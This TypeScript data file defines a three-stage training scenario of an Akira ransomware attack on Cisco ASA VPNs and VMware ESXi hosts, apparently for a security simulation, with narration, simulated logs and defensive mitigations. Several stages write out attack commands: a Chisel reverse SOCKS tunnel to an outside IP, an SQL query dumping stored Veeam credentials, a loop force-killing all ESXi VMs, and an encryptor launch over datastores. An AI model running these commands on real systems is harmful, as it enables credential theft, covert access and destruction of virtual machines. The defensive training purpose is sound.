import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'akira-ransomware-cisco-anyconnect-esxi',
    title: 'Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption (AA24-109A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Akira ransomware affiliates breach perimeter Cisco ASA/FTD AnyConnect VPN appliances (CVE-2020-3259 / CVE-2023-20269), establish Chisel/ngrok tunnels, extract VMware vCenter/ESXi credentials, run esxcli vm process kill on hypervisors, and deploy the Rust/C++ Akira ESXi encryptor.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Akira Affiliate Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Cisco ASA / AnyConnect VPN Appliance', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Windows Jump Host (Chisel & Mimikatz)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA24-109A / Sophos MDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'VMware ESXi Host (esxcli + Rust Akira)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259)',
        narration:
          'Akira affiliates exploit CVE-2023-20269 (unauthorized brute-force/access on Cisco ASA/FTD SSL VPN) or CVE-2020-3259 memory disclosure to authenticate to a single-factor AnyConnect VPN profile without MFA.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1133 - External Remote Services / T1190)',
        technicalCommands: [
          'GET /+CSCOE+/session_password.html HTTP/1.1 (Cisco ASA AnyConnect SSL VPN Login)',
          'Exploit CVE-2023-20269 / CVE-2020-3259 -> Establish AnyConnect DTLS tunnel',
        ],
        defenseMitigation:
          'Patch Cisco ASA/FTD firmware for CVE-2023-20269 and CVE-2020-3259, disable legacy DefaultWEBVPNGroup profiles, and require phishing-resistant MFA on all VPN connection profiles.',
        logs: [
          {
            id: 'akira-1',
            timestamp: '01:14:09.104',
            source: 'Firewall',
            severity: 'critical',
            raw: '%ASA-6-722022: Group <DefaultWEBVPNGroup> User <vendor_support> IP <185.220.101.42> SVC Message: 16/NOTICE: The user has connected | MFA: None (CVE-2023-20269)',
            parsedFields: {
              Appliance: 'Cisco ASA / Firepower Threat Defense',
              VpnGroup: 'DefaultWEBVPNGroup',
              ExploitedCve: 'CVE-2023-20269 / CVE-2020-3259',
              AdvisoryId: 'CISA AA24-109A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi',
        narration:
          'Pivoting onto an internal Windows server, the operator runs Chisel to establish a reverse SOCKS5 proxy over HTTP, extracts stored credentials from the Veeam Backup SQL database and LSASS, and opens an SSH session to the VMware ESXi hypervisors.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Credential Access & Command and Control (T1555 / T1572)',
        technicalCommands: [
          'chisel.exe client https://185.220.101.42:8443 R:socks',
          'sqlcmd -S localhost\\VEEAMSQL2016 -Q "SELECT user_name, password FROM [VeeamBackup].[dbo].[Credentials]"',
        ],
        defenseMitigation:
          'Isolate Veeam backup servers and ESXi management interfaces (`vmk0`) onto dedicated out-of-band management VLANs and disable ESXi SSH (`TSM-SSH`) by default.',
        logs: [
          {
            id: 'akira-2',
            timestamp: '01:28:33.719',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'chisel.exe',
            CommandLine: 'C:\\ProgramData\\chisel.exe client https://185.220.101.42:8443 R:socks',
            raw: 'EventID: 1 | Image: C:\\ProgramData\\chisel.exe | CommandLine: chisel.exe client https://185.220.101.42:8443 R:socks | FollowUp: VeeamBackup Credentials SQL query & SSH to ESXi hypervisor',
            parsedFields: {
              TunnelTool: 'Chisel (HTTP Reverse SOCKS5 Proxy)',
              CredentialSource: 'VeeamBackup SQL Database ([dbo].[Credentials])',
              LateralProtocol: 'SSH (TCP/22) to VMware ESXi Host',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption',
        narration:
          'On the ESXi hypervisor shell, the operator runs a one-line loop invoking esxcli vm process list and esxcli vm process kill --type=force to immediately power off all running virtual machines (unlocking their .vmdk files), then launches the Rust-compiled Akira ELF binary (`megazord` / `akira_esxi`) to encrypt `/vmfs/volumes`.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1489 - Service Stop / T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          'for i in $(esxcli vm process list | grep "World ID:" | awk \'{print $3}\'); do esxcli vm process kill --type=force --world-id=$i; done',
          'nohup /tmp/akira_esxi -p /vmfs/volumes --fork & (Encrypts .vmdk, .vmx, .vswp, .vmsn with ChaCha20/RSA)',
        ],
        defenseMitigation:
          'Enable vSphere 8+ Lockdown Mode (disabling direct root SSH access to ESXi hosts) and forward `/var/log/shell.log` in real time to alert on `esxcli vm process list/kill`.',
        logs: [
          {
            id: 'akira-3',
            timestamp: '01:41:12.005',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'esxcli',
            CommandLine: 'esxcli vm process kill --type=force --world-id=2104892',
            raw: 'ESXi /var/log/shell.log Alert | User: root | Command: esxcli vm process kill --type=force --world-id=2104892 | NextCommand: /tmp/akira_esxi -p /vmfs/volumes --fork | TargetFiles: *.vmdk, *.vmx -> *.akira',
            parsedFields: {
              VmTerminationCommand: 'esxcli vm process kill --type=force',
              HypervisorEncryptor: '/tmp/akira_esxi (Rust ELF Binary)',
              TargetedDatastores: '/vmfs/volumes (*.vmdk, *.vmx, *.vswp)',
            },
          },
        ],
        packets: [],
      },
    ],
  };
